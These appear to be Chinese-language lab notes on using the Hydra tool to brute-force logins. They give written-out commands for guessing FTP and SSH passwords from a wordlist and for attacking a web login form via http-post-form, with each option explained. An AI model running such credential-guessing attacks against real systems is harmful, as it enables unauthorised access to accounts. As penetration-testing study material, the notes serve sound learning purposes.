# Hydra



传递给 Hydra 的选项取决于我们正在攻击的服务（协议）。例如，如果我们想使用用户名 user 和密码列表 passlist.txt 来暴力破解 FTP，我们将使用以下命令：

```
hydra -l user -P passlist.txt ftp://10.10.218.216
```



## ssh

```
hydra -l <username> -P <full path to pass> 10.10.218.216 -t 4 ssh
```



```
hydra -l root -P passwords.txt 10.10.218.216 -t 4 ssh

Hydra 将使用 root 作为 ssh 的用户名
它将尝试 passwords.txt 文件中的密码
将有四个线程并行运行，如 -t 4 所示
```



## webform

也可以使用 Hydra 来暴力破解 Web 表单。您必须知道它正在发出哪种类型的请求；通常使用 GET 或 POST 方法。您可以使用浏览器的网络选项卡（在开发人员工具中）查看请求类型或查看源代码。

```
sudo hydra <username> <wordlist> 10.10.218.216 http-post-form "<path>:<login_credentials>:<invalid_response>"
```



```
hydra -l <username> -P <wordlist> 10.10.218.216 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

登录页面只有 / ，即主 IP 地址。
username 是输入用户名的表单字段
指定的用户名将替换 ^USER^
password 是输入密码的表单字段
提供的密码将替换 ^PASS^
最后， F=incorrect 是登录失败时回显页面出现在服务器回复中的字符串

```

